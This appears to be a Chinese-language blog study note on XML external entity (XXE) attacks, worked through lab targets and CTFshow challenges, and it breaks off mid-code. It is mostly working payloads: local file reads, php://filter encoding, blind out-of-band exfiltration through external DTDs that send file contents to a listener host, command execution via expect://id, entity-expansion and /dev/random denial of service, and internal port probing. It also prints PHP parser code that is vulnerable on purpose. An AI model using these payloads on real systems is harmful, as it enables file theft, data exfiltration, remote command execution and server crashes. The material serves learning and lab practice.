class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://222.txt&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当文件内容当中包含 <code>&lt; 和 &amp;</code> 符号时，就会出现报错</p><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p><p><img src="https://i.loli.net/2021/10/01/ZvIz6LwdcMQANU9.png" alt="image-20210427191730235"></p><p>解决：使用 <code>CDATA</code></p><p>想法一：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;<span class="built_in">test</span>;]]&gt;&lt;/creds&gt;<span class="comment">#错误：这只会将 &amp;test; 原模原样的输出</span></span><br></pre></td></tr></table></figure><p>想法二：直接在 xml当中进行拼接 —- 普通实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY end <span class="string">&quot;]]&gt;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;start;&amp;<span class="built_in">test</span>;&amp;end;&lt;/creds&gt;<span class="comment">#依旧是大量的报错</span></span><br></pre></td></tr></table></figure><p>想法三：参数实体 在 内部DTD拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end  <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;<span class="comment">#仍旧有报错</span></span><br></pre></td></tr></table></figure><p>根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中” ;</p><p>也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来.</p><p>想法四：使用外部参数实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;file:///d:/xxe.dtd&quot;</span>&gt;%dtd; ]&gt;&lt;creds&gt;&amp;all;&lt;/creds&gt;xxe.dtd:&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可成功显示出 &amp; &lt; 符号</p><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p><p>php://filter是PHP语言中特有的协议流</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;<span class="built_in">test</span>;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span> &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM <span class="string">&quot;data://text/plain;base64,&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/O7yTFhPHXEMZ5KD.png" alt="image-20210430094755236"></p><p><img src="https://i.loli.net/2021/10/01/lnXdb7kDyQFq5K6.png" alt="image-20210430094745930"></p><h3 id="3-1-2-无回显"><a href="#3-1-2-无回显" class="headerlink" title="3.1.2 无回显"></a>3.1.2 无回显</h3><p><strong>利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定的服务器发起请求，然后在其指定服务器的日志中读出文件内容</strong></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>libxml_disable_entity_loader (<span class="literal">false</span>);<span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//未输出<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>日志的读取/文件的接收代码 或者是 开启端口监听</p><p>开启端口监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer portpython3语法：python -m http.server port</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/7h6VMgZPfzImFHe.png" alt="image-20210430092340860"></p><p>说明：</p><blockquote><p>我们总共连续调用了三个参数实体，%test;%int;%send;</p><p>首先调用%test去请求远程服务器上的xxe2.dtd，相当于将xxe2.dtd包含进来，然后调用 %int，在xxe2.dtd文件当中将会调用%file，%file将会获取服务器上的敏感文件222.txt，然后将%file（敏感文件当中的内容）写入%send当中(由于实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)；</p><p>最后调用 %send ，就会将我们读取到的数据发送到远程 vps上，也就实现了</p><p><strong>外带数据</strong>   的效果，解决了xxe无回显的问题。</p></blockquote><hr><hr><p><strong>引入服务器文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span>%remote;%send;]&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xml.dtd:&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;%start;</span><br></pre></td></tr></table></figure><p><strong>引入本地文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % ISOamso &#x27;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval;&amp;#x25;send;&#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p><strong>嵌套参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;%start;%send;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure><p><strong>三层嵌套参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message ANY&gt;&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % para &#x27;&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;&amp;#x25;para2;&#x27;&gt;%para;]&gt;&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure><p><a href="cnblogs.com/20175211lyz/p/11413335.html">更多绕过姿势</a></p><hr><h4 id="HTTP-内网主机探测-–-端口扫描"><a href="#HTTP-内网主机探测-–-端口扫描" class="headerlink" title="HTTP 内网主机探测 – 端口扫描"></a>HTTP 内网主机探测 – 端口扫描</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;  &lt;!DOCTYPE data SYSTEM <span class="string">&quot;http://127.0.0.1:8080/&quot;</span> [  ]&gt;&lt;data&gt;<span class="number">4</span>&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>可结合 burp 爆破模块</p><h4 id="RCE-PHP-expect模块开启"><a href="#RCE-PHP-expect模块开启" class="headerlink" title="RCE : PHP expect模块开启"></a>RCE : PHP expect模块开启</h4><p>条件：安装 expect扩展的情况下，在PHP环境当中执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ELEMENT  ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></pre></td></tr></table></figure><h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;     &lt;!DOCTYPE lolz [     &lt;!ENTITY lol &quot;lol&quot;&gt;     &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;     &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;     &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;     &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;     &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;     &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;     &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;     &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;     ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。</p><p>UNIX 下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h3 id="3-1-3-Pikachu"><a href="#3-1-3-Pikachu" class="headerlink" title="3.1.3 Pikachu"></a>3.1.3 Pikachu</h3><p><strong>读取文件（敏感）</strong></p><p>测试环境：Pikachu</p><p><strong>有回显</strong></p><p><strong>直接读取本地文件进行测验</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d:/test.txt&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><strong>引入外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://xxe/1.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.dtd:&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; </span><br></pre></td></tr></table></figure><p><strong>php伪协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><strong>利用php扩展 expect 执行系统命令 — RCE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure><p><strong>无回显</strong></p><p>Payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://xxe/4.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure><p>Payload2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>端口监听</strong></p><p><img src="https://i.loli.net/2021/10/01/E7ipC4frbYIVXBT.png" alt="image-20210430093026570"></p><p>日志的读取/文件的接收代码 或者是 开启端口监听</p><p><strong>日志查看</strong></p><p>环境：win-2003</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.158.115/xxe/3.dtd&quot;&gt;%dtd;%send;]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.dtd:&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxe:2222/?data=%file;&#x27;&gt;&quot;&gt;%payload;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/v7K6L4nsfyYhGxm.png" alt="image-20210430094003726"></p><h3 id="3-1-4-xxe-lab"><a href="#3-1-4-xxe-lab" class="headerlink" title="3.1.4 xxe-lab"></a>3.1.4 xxe-lab</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/Windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h3 id="3-1-5-xlsx-文件攻击"><a href="#3-1-5-xlsx-文件攻击" class="headerlink" title="3.1.5 xlsx 文件攻击"></a>3.1.5 xlsx 文件攻击</h3><p><a href="https://blog.csdn.net/qq_36093477/article/details/82849631">xlsx 文件上传</a></p><h2 id="3-2-绕过方式"><a href="#3-2-绕过方式" class="headerlink" title="3.2 绕过方式"></a>3.2 绕过方式</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">参考</a></p><p><a href="https://xz.aliyun.com/t/4059">https://xz.aliyun.com/t/4059</a></p><h2 id="3-3-检测"><a href="#3-3-检测" class="headerlink" title="3.3 检测"></a>3.3 检测</h2><ul><li><p>工具</p></li><li><p>人工</p><p>数据格式类型判断</p><p>Content-Type值判断 text/xml   application/xml</p><p>盲猜：更改Content-Type值尝试</p></li></ul><h2 id="3-4-工具"><a href="#3-4-工具" class="headerlink" title="3.4 工具"></a>3.4 工具</h2><p>XXEinjector(Ruby)</p><p><a href="https://blog.csdn.net/lm2017/article/details/88394859">安装</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">使用</a></p><h2 id="3-5-练题"><a href="#3-5-练题" class="headerlink" title="3.5 练题"></a>3.5 练题</h2><h3 id="3-5-1-CTF-show"><a href="#3-5-1-CTF-show" class="headerlink" title="3.5.1 CTF show"></a>3.5.1 CTF show</h3><p>373</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;highlight_file(__FILE__);    </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>374</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag&quot;&gt;&lt;!ENTITY % hack SYSTEM &quot;http://xxe/test.dtd&quot;&gt;%hack;%dtd;%xxe;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.dtd:&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://xxe:3333/%file;&#x27;&gt; &quot;&gt;%dtd;%xxe;</span><br></pre></td></tr></table></figure><p>引用%hack后调用外部文件，后调用%dtd引入嵌套的payload后引用%xxe接收数据</p><p>监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer python3语法：python -m http.server</span><br></pre></td></tr></table></figure><p>375</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;   die(&#x27;error&#x27;); &#125; if(isset($xmlfile))&#123;   $dom = new DOMDocument();   $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure><p>376</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;    die(&#x27;error&#x27;);&#125;if(isset($xmlfile))&#123;    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);&#125;highlight_file(__FILE__);   </span><br></pre></td></tr></table></figure><p>377</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;, $xmlfile))&#123;    